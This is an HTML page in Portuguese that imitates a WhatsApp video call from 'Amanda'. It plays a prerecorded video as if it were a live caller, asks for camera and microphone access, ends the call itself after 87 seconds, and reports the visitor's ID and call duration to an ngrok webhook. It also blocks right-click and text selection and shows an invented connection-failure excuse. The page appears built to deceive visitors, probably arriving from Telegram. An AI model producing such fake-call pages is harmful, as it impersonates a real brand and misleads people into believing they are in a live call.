<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Video Call</title>
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #000;
            overflow: hidden;
            position: relative;
            height: 100vh;
            width: 100vw;
        }

        /* Background com vídeo */
        .video-background {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
        }

        .background-video {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            min-width: 100%;
            min-height: 100%;
            width: auto;
            height: auto;
            object-fit: cover;
            filter: brightness(0.4) blur(1px);
        }

        /* Fallback estático se vídeo não carregar */
        .static-background {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
            background-size: 400% 400%;
            animation: gradientShift 8s ease infinite;
            display: none;
        }

        @keyframes gradientShift {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        .video-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.3);
        }

        /* Header */
        .header {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 100px;
            background: linear-gradient(180deg, rgba(0,0,0,0.8) 0%, rgba(0,0,0,0.3) 70%, transparent 100%);
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 40px 20px 20px;
            z-index: 10;
        }

        .contact-info {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .contact-avatar {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: linear-gradient(135deg, #25D366, #128C7E);
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
            font-size: 16px;
            border: 3px solid #25D366;
            box-shadow: 0 0 0 2px rgba(37, 211, 102, 0.3);
        }

        .contact-details h3 {
            color: white;
            font-size: 16px;
            font-weight: 500;
            margin-bottom: 2px;
        }

        .call-status {
            color: rgba(255,255,255,0.8);
            font-size: 13px;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 0.8; }
            50% { opacity: 1; }
        }

        /* Self Video Preview */
        .self-video {
            position: absolute;
            top: 120px;
            right: 20px;
            width: 120px;
            height: 180px;
            background: #333;
            border-radius: 12px;
            overflow: hidden;
            z-index: 5;
            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
            border: 2px solid #25D366;
        }

        .user-video {
            width: 100%;
            height: 100%;
            object-fit: cover;
            transform: scaleX(-1);
            display: none;
        }

        .camera-placeholder {
            width: 100%;
            height: 100%;
            background: #333;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            color: #666;
            font-size: 24px;
            text-align: center;
        }

        .camera-placeholder .icon {
            font-size: 36px;
            margin-bottom: 8px;
        }

        .camera-placeholder .text {
            font-size: 10px;
            opacity: 0.7;
        }

        /* Cronômetro */
        .timer-container {
            position: absolute;
            top: 310px;
            right: 20px;
            width: 120px;
            text-align: center;
            z-index: 6;
        }

        .call-timer {
            color: white;
            font-size: 14px;
            font-weight: 600;
            background: rgba(0,0,0,0.8);
            padding: 8px 12px;
            border-radius: 12px;
            display: inline-block;
            border: 1px solid rgba(255,255,255,0.2);
        }

        /* Bottom Controls */
        .controls {
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            height: 150px;
            background: linear-gradient(0deg, rgba(0,0,0,0.9) 0%, rgba(0,0,0,0.5) 60%, transparent 100%);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 40px;
            padding-bottom: 40px;
        }

        .control-btn {
            width: 60px;
            height: 60px;
            border-radius: 50%;
            border: none;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
            transition: all 0.3s;
            outline: none;
            -webkit-tap-highlight-color: transparent;
        }

        .control-btn:active {
            transform: scale(0.9);
        }

        .btn-end {
            background: #ff4757;
            color: white;
            box-shadow: 0 4px 20px rgba(255, 71, 87, 0.4);
        }

        .btn-mute {
            background: rgba(255,255,255,0.2);
            color: white;
            border: 2px solid rgba(255,255,255,0.3);
        }

        .btn-mute.muted {
            background: #ff4757;
            border-color: #ff4757;
        }

        .btn-camera {
            background: rgba(255,255,255,0.2);
            color: white;
            border: 2px solid rgba(255,255,255,0.3);
        }

        .btn-camera.off {
            background: #ff4757;
            border-color: #ff4757;
        }

        /* Permission Dialog */
        .permission-dialog {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.9);
            display: none;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 1000;
            color: white;
            text-align: center;
            padding: 20px;
        }

        .permission-dialog button {
            padding: 12px 24px;
            margin: 10px;
            border: none;
            border-radius: 25px;
            font-size: 16px;
            cursor: pointer;
            transition: all 0.3s;
        }

        .btn-primary {
            background: #25D366;
            color: white;
        }

        .btn-secondary {
            background: transparent;
            color: #ccc;
            border: 1px solid #666;
        }

        /* Status indicators */
        .camera-on .user-video {
            display: block;
        }

        .camera-on .camera-placeholder {
            display: none;
        }

        .camera-off .user-video {
            display: none;
        }

        .camera-off .camera-placeholder {
            display: flex;
        }
    </style>
</head>
<body>
    <!-- Background com vídeo -->
    <div class="video-background">
        <video class="background-video" id="backgroundVideo" autoplay loop playsinline muted preload="metadata">
            <source src="video.mp4" type="video/mp4">
        </video>
        <div class="video-overlay"></div>
    </div>
    
    <!-- Fallback estático -->
    <div class="static-background" id="staticBackground"></div>

    <!-- Header -->
    <div class="header">
        <div class="contact-info">
            <div class="contact-avatar">AM</div>
            <div class="contact-details">
                <h3>Amanda</h3>
                <div class="call-status" id="callStatus">Chamando...</div>
            </div>
        </div>
    </div>

    <!-- Self Video Preview -->
    <div class="self-video camera-off">
        <video class="user-video" id="userVideo" autoplay playsinline muted></video>
        <div class="camera-placeholder">
            <div class="icon">📷</div>
            <div class="text">Câmera Desligada</div>
        </div>
    </div>

    <!-- Cronômetro -->
    <div class="timer-container">
        <div class="call-timer" id="callTimer">00:00</div>
    </div>

    <!-- Bottom Controls -->
    <div class="controls">
        <button class="control-btn btn-mute" id="muteBtn" onclick="toggleMute()">
            🎤
        </button>
        <button class="control-btn btn-end" id="endBtn" onclick="endCall()">
            📞
        </button>
        <button class="control-btn btn-camera" id="cameraBtn" onclick="toggleCamera()">
            📹
        </button>
    </div>

    <!-- Permission Dialog -->
    <div class="permission-dialog" id="permissionDialog">
        <div style="font-size: 64px; margin-bottom: 20px;">📹</div>
        <h2 style="margin-bottom: 15px;">Permitir Acesso à Câmera</h2>
        <p style="margin-bottom: 30px; opacity: 0.8; line-height: 1.4; max-width: 300px;">
            Para participar da videochamada, precisamos acessar sua câmera e microfone.
        </p>
        <button class="btn-primary" onclick="requestCamera()">Permitir Acesso</button>
        <button class="btn-secondary" onclick="closePermissionDialog()">Agora Não</button>
    </div>

    <script>
        // 🔥 VARIÁVEIS SIMPLES
        let isMuted = false;
        let cameraOn = false;
        let callStarted = false;
        let callTimer = 0;
        let timerInterval;
        let userStream = null;
        
        // 🔥 DETECTAR TELEGRAM
        const isTelegram = /TelegramBot|Telegram/i.test(navigator.userAgent) || window.TelegramWebviewProxy;

        // 🔥 ELEMENTOS
        const userVideo = document.getElementById('userVideo');
        const muteBtn = document.getElementById('muteBtn');
        const cameraBtn = document.getElementById('cameraBtn');
        const endBtn = document.getElementById('endBtn');
        const callStatus = document.getElementById('callStatus');
        const permissionDialog = document.getElementById('permissionDialog');
        const selfVideoContainer = document.querySelector('.self-video');

        // 🔥 LOG INICIAL
        console.log('🚀 Videochamada iniciando...');
        console.log('📱 User Agent:', navigator.userAgent);
        console.log('🎥 MediaDevices:', !!navigator.mediaDevices);
        console.log('🤖 Telegram detectado:', isTelegram);

        // 🔥 FUNÇÃO: INICIALIZAR VÍDEO DE FUNDO
        function initBackgroundVideo() {
            const video = document.getElementById('backgroundVideo');
            const staticBg = document.getElementById('staticBackground');
            
            if (!video) return;
            
            console.log('🎬 Inicializando vídeo de fundo...');
            
            // Event listeners para detectar problemas
            video.addEventListener('loadstart', () => {
                console.log('📹 Vídeo começando a carregar...');
            });
            
            video.addEventListener('canplay', () => {
                console.log('✅ Vídeo pode reproduzir');
                video.play().catch(e => {
                    console.log('❌ Erro no autoplay, usando fallback');
                    activateStaticBackground();
                });
            });
            
            video.addEventListener('error', (e) => {
                console.log('❌ Erro no vídeo:', e);
                activateStaticBackground();
            });
            
            video.addEventListener('stalled', () => {
                console.log('⏸️ Vídeo travou');
                setTimeout(() => {
                    if (video.readyState < 3) {
                        console.log('⏰ Timeout: ativando fallback estático');
                        activateStaticBackground();
                    }
                }, 3000);
            });
            
            // Configurações específicas para Telegram
            if (isTelegram) {
                console.log('🤖 Modo Telegram: sem áudio no vídeo de fundo');
                video.muted = true;
                video.volume = 0;
                
                // Timeout mais curto para Telegram
                setTimeout(() => {
                    if (video.readyState < 2) {
                        console.log('⏰ Timeout Telegram: ativando fallback');
                        activateStaticBackground();
                    }
                }, 2000);
            } else {
                console.log('🌐 Navegador normal: ativando áudio após 3s');
                // Tentar ativar áudio após 3 segundos
                setTimeout(() => {
                    if (video && !video.paused) {
                        video.muted = false;
                        video.volume = 0.7;
                        console.log('🔊 Áudio do vídeo ativado');
                    }
                }, 3000);
            }
            
            // Iniciar reprodução
            video.play().catch(e => {
                console.log('❌ Autoplay falhou:', e);
                activateStaticBackground();
            });
        }

        // 🔥 FUNÇÃO: ATIVAR FUNDO ESTÁTICO
        function activateStaticBackground() {
            console.log('🔄 Ativando fundo estático (fallback)');
            const videoBg = document.querySelector('.video-background');
            const staticBg = document.getElementById('staticBackground');
            
            if (videoBg) videoBg.style.display = 'none';
            if (staticBg) staticBg.style.display = 'block';
        }

        // 🔥 FUNÇÃO: SOLICITAR CÂMERA
        async function requestCamera() {
            console.log('📹 Solicitando acesso à câmera...');
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { 
                        facingMode: 'user',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    },
                    audio: true
                });
                
                console.log('✅ Câmera liberada!');
                userStream = stream;
                userVideo.srcObject = stream;
                
                // Ativar visualmente
                cameraOn = true;
                updateCameraUI();
                closePermissionDialog();
                
            } catch (error) {
                console.error('❌ Erro na câmera:', error);
                alert('Não foi possível acessar a câmera. Verifique as permissões.');
                closePermissionDialog();
            }
        }

        // 🔥 FUNÇÃO: FECHAR DIALOG
        function closePermissionDialog() {
            permissionDialog.style.display = 'none';
        }

        // 🔥 FUNÇÃO: MOSTRAR DIALOG
        function showPermissionDialog() {
            permissionDialog.style.display = 'flex';
        }

        // 🔥 FUNÇÃO: TOGGLE CÂMERA
        function toggleCamera() {
            console.log('🔄 Toggle câmera - Estado:', cameraOn);
            
            if (!userStream) {
                // Primeira vez - solicitar permissão
                showPermissionDialog();
                return;
            }
            
            // Já tem stream - toggle
            cameraOn = !cameraOn;
            
            if (userStream) {
                userStream.getVideoTracks().forEach(track => {
                    track.enabled = cameraOn;
                });
            }
            
            updateCameraUI();
        }

        // 🔥 FUNÇÃO: ATUALIZAR UI CÂMERA
        function updateCameraUI() {
            if (cameraOn) {
                selfVideoContainer.className = 'self-video camera-on';
                cameraBtn.className = 'control-btn btn-camera';
                cameraBtn.textContent = '📹';
                console.log('📹 Câmera LIGADA');
            } else {
                selfVideoContainer.className = 'self-video camera-off';
                cameraBtn.className = 'control-btn btn-camera off';
                cameraBtn.textContent = '📷';
                console.log('📷 Câmera DESLIGADA');
            }
        }

        // 🔥 FUNÇÃO: TOGGLE MUTE
        function toggleMute() {
            console.log('🔄 Toggle mute - Estado:', isMuted);
            
            isMuted = !isMuted;
            
            if (userStream) {
                userStream.getAudioTracks().forEach(track => {
                    track.enabled = !isMuted;
                });
            }
            
            updateMuteUI();
        }

        // 🔥 FUNÇÃO: ATUALIZAR UI MUTE
        function updateMuteUI() {
            if (isMuted) {
                muteBtn.className = 'control-btn btn-mute muted';
                muteBtn.textContent = '🔇';
                console.log('🔇 Microfone MUTADO');
            } else {
                muteBtn.className = 'control-btn btn-mute';
                muteBtn.textContent = '🎤';
                console.log('🎤 Microfone ATIVO');
            }
        }

        // 🔥 FUNÇÃO: INICIAR CHAMADA
        function startCall() {
            if (callStarted) return;
            
            console.log('📞 Iniciando chamada...');
            callStarted = true;
            callStatus.textContent = 'Conectado';
            
            // Timer
            timerInterval = setInterval(() => {
                callTimer++;
                const minutes = Math.floor(callTimer / 60);
                const seconds = callTimer % 60;
                document.getElementById('callTimer').textContent = 
                    `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
            }, 1000);
            
            // Solicitar câmera após 3 segundos
            setTimeout(() => {
                if (!userStream) {
                    showPermissionDialog();
                }
            }, 3000);
            
            // Auto-encerrar após 87 segundos
            setTimeout(() => {
                endCall();
            }, 87000);
        }

        // 🔥 FUNÇÃO: ENCERRAR CHAMADA
        function endCall() {
            console.log('🔴 Encerrando chamada...');
            
            // Parar timer
            if (timerInterval) {
                clearInterval(timerInterval);
            }
            
            // Parar streams
            if (userStream) {
                userStream.getTracks().forEach(track => {
                    track.stop();
                    console.log('🛑 Track parado:', track.kind);
                });
            }
            
            // Parar vídeo de fundo
            const backgroundVideo = document.getElementById('backgroundVideo');
            if (backgroundVideo) {
                backgroundVideo.pause();
                backgroundVideo.currentTime = 0;
            }
            
            // Enviar webhook
            sendWebhook();
            
            // Tela de fim
            setTimeout(showEndScreen, 500);
        }

        // 🔥 FUNÇÃO: ENVIAR WEBHOOK
        function sendWebhook() {
            const urlParams = new URLSearchParams(window.location.search);
            const userId = urlParams.get('u');
            const duration = document.getElementById('callTimer').textContent;
            
            if (!userId) {
                console.log('❌ Sem userId para webhook');
                return;
            }
            
            // Detectar se é mobile/telegram
            const isMobile = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
            const webhookUrl = isMobile ? 
                'https://056a-45-174-80-203.ngrok-free.app/api/call-ended' : 
                'http://localhost:5000/api/call-ended';
            
            console.log('📡 Enviando webhook:', webhookUrl);
            
            fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    userId: userId,
                    duration: duration || "01:27"
                })
            })
            .then(response => {
                console.log('✅ Webhook enviado:', response.status);
                return response.json();
            })
            .then(data => {
                console.log('📝 Resposta webhook:', data);
            })
            .catch(error => {
                console.error('❌ Erro webhook:', error);
            });
        }

        // 🔥 FUNÇÃO: TELA DE FIM
        function showEndScreen() {
            document.body.innerHTML = `
                <div style="display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; color: white; text-align: center; background: #000;">
                    <div style="font-size: 64px; margin-bottom: 20px;">📞</div>
                    <h2 style="margin-bottom: 10px;">Chamada Encerrada</h2>
                    <p style="opacity: 0.7; margin-bottom: 30px;">Duração: ${document.getElementById('callTimer').textContent}</p>
                    <button onclick="location.reload()" style="padding: 12px 24px; background: #25D366; color: white; border: none; border-radius: 25px; font-size: 16px; cursor: pointer;">Nova Chamada</button>
                </div>
            `;
        }

        // 🔥 VALIDAÇÃO DA URL
        function validateUrl() {
            const urlParams = new URLSearchParams(window.location.search);
            const timestamp = urlParams.get('t');
            const userId = urlParams.get('u');

            if (!timestamp || !userId) {
                showErrorScreen();
                return false;
            }

            const now = Math.floor(Date.now() / 1000);
            const linkAge = now - parseInt(timestamp);

            if (linkAge > 1800) { // 30 minutos
                showErrorScreen();
                return false;
            }

            return true;
        }

        // 🔥 TELA DE ERRO
        function showErrorScreen() {
            document.body.innerHTML = `
                <div style="display: flex; align-items: center; justify-content: center; height: 100vh; background: #000; color: white; text-align: center; padding: 20px;">
                    <div>
                        <div style="font-size: 64px; margin-bottom: 20px;">❌</div>
                        <h1 style="font-size: 22px; margin-bottom: 16px;">Chamada não encontrada</h1>
                        <p style="color: #999; font-size: 16px;">Esta videochamada foi encerrada devido a instabilidade na conexão de internet da usuária Mary.</p>
                    </div>
                </div>
            `;
        }

        // 🔥 INICIALIZAÇÃO
        document.addEventListener('DOMContentLoaded', function() {
            console.log('📱 DOM carregado');
            
            // Validar URL
            if (!validateUrl()) {
                return;
            }
            
            // Inicializar vídeo de fundo
            setTimeout(() => {
                initBackgroundVideo();
            }, 500);
            
            // Inicializar UI
            updateCameraUI();
            updateMuteUI();
            
            console.log('✅ Sistema pronto');
        });

        // 🔥 AUTO-INICIAR CHAMADA
        setTimeout(() => {
            startCall();
        }, 3000);

        // 🔥 PREVENÇÕES
        document.addEventListener('contextmenu', e => e.preventDefault());
        document.addEventListener('selectstart', e => e.preventDefault());

        // 🔥 FEEDBACK DE TOQUE
        document.querySelectorAll('.control-btn').forEach(btn => {
            btn.addEventListener('touchstart', function() {
                this.style.transform = 'scale(0.9)';
            });
            
            btn.addEventListener('touchend', function() {
                this.style.transform = 'scale(1)';
            });
        });

        // 🔥 LIMPEZA QUANDO SAIR DA PÁGINA
        window.addEventListener('beforeunload', function() {
            console.log('🧹 Limpando recursos...');
            if (userStream) {
                userStream.getTracks().forEach(track => track.stop());
            }
            const video = document.getElementById('backgroundVideo');
            if (video) {
                video.pause();
                video.src = '';
                video.load();
            }
        });

        console.log('🎬 Script carregado completamente');
    </script>
</body>
</html>
